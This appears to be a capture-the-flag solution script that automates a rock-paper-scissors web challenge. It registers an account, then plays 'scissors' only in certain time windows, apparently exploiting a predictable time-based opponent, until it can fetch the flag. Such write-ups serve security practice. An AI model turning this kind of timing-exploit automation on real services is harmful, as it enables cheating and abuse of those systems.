import requests
import sys
from datetime import datetime, timezone
import re

if len(sys.argv) != 3:
	print('Usage: solution.py <challenge-url> <username>')

# Variables 
url = sys.argv[1]
username = sys.argv[2]
password = "wg4TQ6m4lV!!"

# Set-up your main user
with requests.Session() as s:
    print("Registering user")
    regParam = {'username':username,'password':password,'confirm':password,'submit':'Register'}
    s.post(url + '/register',json=regParam)
    print("Logging in")
    loginParam = {'username':username,'password':password,'submit':'Login'}
    s.post(url + '/login', json=loginParam)
    score = 0
    while score < 50:
        r = s.get(url + '/home')
        match =  re.search('\Score:\s(\d*)', r.text)
        score = int(match.group(1))
        print("Score:", score)
        minute = datetime.now(tz=timezone.utc).minute
        second = datetime.now(tz=timezone.utc).second
        if minute in  range(0, 62, 2):
            if second < 30:
                s.get(url + '/round?pick=scissors')
    r = s.get(url + '/flag')
    print(r.text)